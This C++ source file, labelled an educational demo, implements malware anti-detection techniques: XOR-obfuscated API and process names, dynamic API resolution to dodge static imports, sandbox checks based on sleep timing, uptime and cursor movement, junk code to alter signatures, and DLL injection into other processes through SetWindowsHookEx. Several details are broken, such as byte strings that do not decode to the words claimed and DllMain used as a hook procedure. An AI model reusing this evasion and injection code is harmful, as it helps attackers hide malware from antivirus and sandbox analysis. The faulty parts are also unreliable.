// Anti-Detection Techniques Demo
// WARNING: Educational purpose only!

#include <Windows.h>
#include <string>
#include <iostream>
#include <ctime>
#include <cstdlib>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// 1. String Obfuscation - Hide suspicious strings
class StringObfuscator {
private:
    static std::string xorString(const std::string& input, char key) {
        std::string result = input;
        for (size_t i = 0; i < result.length(); i++) {
            result[i] ^= key;
        }
        return result;
    }

public:
    // Hide "LoadLibraryA" string
    static std::string getLoadLibraryString() {
        std::string obfuscated = "\x0C\x0F\x0E\x04\x0C\x06\x09\x08\x0E\x08\x19\x01"; // "LoadLibraryA" ^ 0x6A
        return xorString(obfuscated, 0x6A);
    }
    
    // Hide process names
    static std::string getNotepadString() {
        std::string obfuscated = "\x04\x0F\x1A\x0B\x10\x0E\x04\x2B\x0B\x05\x0B"; // "notepad.exe" ^ 0x6A
        return xorString(obfuscated, 0x6A);
    }
};

// 2. API Obfuscation - Dynamic API loading
class APIObfuscator {
private:
    HMODULE hKernel32;
    HMODULE hAdvapi32;

public:
    APIObfuscator() {
        // Load modules dynamically
        hKernel32 = LoadLibraryA("kernel32.dll");
        hAdvapi32 = LoadLibraryA("advapi32.dll");
    }

    // Dynamically resolve APIs to avoid static imports
    FARPROC GetAPI(const std::string& dllName, const std::string& funcName) {
        HMODULE hMod = GetModuleHandleA(dllName.c_str());
        if (!hMod) {
            hMod = LoadLibraryA(dllName.c_str());
        }
        
        if (hMod) {
            return GetProcAddress(hMod, funcName.c_str());
        }
        return nullptr;
    }

    // Wrapper functions
    HANDLE MyOpenProcess(DWORD access, BOOL inherit, DWORD pid) {
        typedef HANDLE(WINAPI* OpenProcessFunc)(DWORD, BOOL, DWORD);
        OpenProcessFunc pOpenProcess = (OpenProcessFunc)GetAPI("kernel32.dll", "OpenProcess");
        return pOpenProcess ? pOpenProcess(access, inherit, pid) : nullptr;
    }

    LPVOID MyVirtualAllocEx(HANDLE proc, LPVOID addr, SIZE_T size, DWORD type, DWORD protect) {
        typedef LPVOID(WINAPI* VirtualAllocExFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
        VirtualAllocExFunc pVirtualAllocEx = (VirtualAllocExFunc)GetAPI("kernel32.dll", "VirtualAllocEx");
        return pVirtualAllocEx ? pVirtualAllocEx(proc, addr, size, type, protect) : nullptr;
    }
};

// 3. Timing Delays - Evade sandbox analysis
class SandboxEvasion {
public:
    static bool IsRealEnvironment() {
        // Check if running too fast (sandbox indicator)
        DWORD startTime = GetTickCount();
        Sleep(3000); // Sleep 3 seconds
        DWORD elapsed = GetTickCount() - startTime;
        
        // Sandbox might accelerate time
        if (elapsed < 2500) {
            return false; // Likely sandbox
        }

        // Check system uptime
        DWORD uptime = GetTickCount();
        if (uptime < 300000) { // Less than 5 minutes uptime
            return false; // Fresh VM/sandbox
        }

        return true;
    }

    static bool HasUserActivity() {
        // Check for user interaction
        POINT cursor1, cursor2;
        GetCursorPos(&cursor1);
        Sleep(100);
        GetCursorPos(&cursor2);
        
        // If cursor moved, user is active
        return (cursor1.x != cursor2.x || cursor1.y != cursor2.y);
    }
};

// 4. Polymorphic Code - Change binary signature
class PolymorphicGenerator {
public:
    static void AddJunkCode() {
        // Add meaningless operations to change signature
        volatile int dummy = 0;
        for (int i = 0; i < 1000; i++) {
            dummy += i * 2;
            dummy ^= GetTickCount();
        }
    }

    static void RandomSleep() {
        // Random delays
        srand((unsigned)time(NULL));
        Sleep(rand() % 1000 + 500);
    }
};

// 5. Process Hollowing Alternative - More stealthy injection
class StealthInjection {
public:
    // Use alternative injection method
    static bool InjectViaWindowHook(const std::wstring& targetProcess, const std::string& dllPath) {
        // Find target window
        HWND hWnd = FindWindowW(NULL, L"Untitled - Notepad");
        if (!hWnd) return false;

        DWORD pid;
        GetWindowThreadProcessId(hWnd, &pid);

        // Use SetWindowsHookEx for less suspicious injection
        HMODULE hMod = LoadLibraryA(dllPath.c_str());
        if (!hMod) return false;

        HOOKPROC hookProc = (HOOKPROC)GetProcAddress(hMod, "DllMain");
        if (!hookProc) return false;

        HHOOK hHook = SetWindowsHookEx(WH_GETMESSAGE, hookProc, hMod, 0);
        return hHook != NULL;
    }
};

// Main function with evasion techniques
int main() {
    std::cout << "=== Advanced Evasion Demo ===" << std::endl;
    
    // 1. Sandbox detection
    if (!SandboxEvasion::IsRealEnvironment()) {
        std::cout << "Sandbox detected, exiting..." << std::endl;
        return 0;
    }

    // 2. User activity check
    if (!SandboxEvasion::HasUserActivity()) {
        std::cout << "No user activity, waiting..." << std::endl;
        Sleep(10000); // Wait for user activity
    }

    // 3. Add junk code
    PolymorphicGenerator::AddJunkCode();

    // 4. Random delay
    PolymorphicGenerator::RandomSleep();

    // 5. Use obfuscated APIs
    APIObfuscator apiObf;
    
    // Continue with injection using obfuscated APIs...
    std::cout << "Evasion techniques demonstrated." << std::endl;
    std::cout << "Press Enter to exit..." << std::endl;
    std::cin.get();
    
    return 0;
}
